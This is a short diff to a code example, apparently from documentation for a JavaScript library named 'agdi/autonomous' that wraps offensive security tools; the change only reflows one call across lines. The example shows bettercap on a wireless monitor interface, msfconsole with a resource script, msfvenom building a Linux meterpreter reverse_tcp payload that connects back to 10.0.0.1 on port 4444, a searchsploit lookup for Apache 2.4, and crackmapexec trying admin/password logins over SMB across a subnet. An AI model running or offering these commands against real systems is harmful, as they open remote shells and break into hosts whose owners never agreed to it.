@@ -76,7 +76,16 @@ await WirelessAttacks.bettercap("-iface", "wlan0mon");
 import { Exploitation } from "agdi/autonomous";
 
 await Exploitation.msfconsole("exploit.rc");
-await Exploitation.msfvenom("-p", "linux/x64/meterpreter/reverse_tcp", "LHOST=10.0.0.1", "LPORT=4444", "-f", "elf", "-o", "payload");
+await Exploitation.msfvenom(
+  "-p",
+  "linux/x64/meterpreter/reverse_tcp",
+  "LHOST=10.0.0.1",
+  "LPORT=4444",
+  "-f",
+  "elf",
+  "-o",
+  "payload",
+);
 await Exploitation.searchsploit("apache 2.4");
 await Exploitation.crackmapexec("smb", "10.0.0.0/24", "-u", "admin", "-p", "password");
 ```
